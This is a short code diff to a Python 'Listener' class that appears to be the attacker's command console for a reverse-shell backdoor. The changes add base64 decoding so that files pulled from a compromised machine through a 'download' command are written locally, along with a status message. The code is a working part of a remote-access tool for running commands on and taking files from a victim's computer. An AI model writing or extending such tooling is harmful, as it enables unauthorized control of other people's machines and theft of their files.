@@ -2,6 +2,7 @@
 
 import socket
 import json
+import base64
 
 
 class Listener:
@@ -36,13 +37,15 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download Successful..."
 
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
+            if command[0] == "download":
+                print("[+] Downloading " + command[1])
             result = self.execute_remotely(command)
             if command[0] == "download":
                 result = self.write_file(path=command[1], content=result)
